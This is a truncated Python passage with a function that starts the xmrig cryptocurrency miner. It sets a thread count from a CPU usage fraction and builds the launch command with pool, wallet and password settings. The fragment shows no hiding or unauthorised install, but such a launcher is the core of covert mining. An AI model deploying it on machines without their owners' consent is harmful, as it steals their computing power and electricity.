...
def start_miner(xmrig_path):
    """Start xmrig and return a psutil.Process object controlling it."""
    total = psutil.cpu_count() if psutil else os.cpu_count()
    threads = max(1, int((total or 1) * CPU_USAGE_PERCENT))

    if IS_WINDOWS:
        cmd = [xmrig_path, "-o", POOL_ADDRESS, "-u", WALLET_ADDRESS, "-p", POOL_PASSWORD]
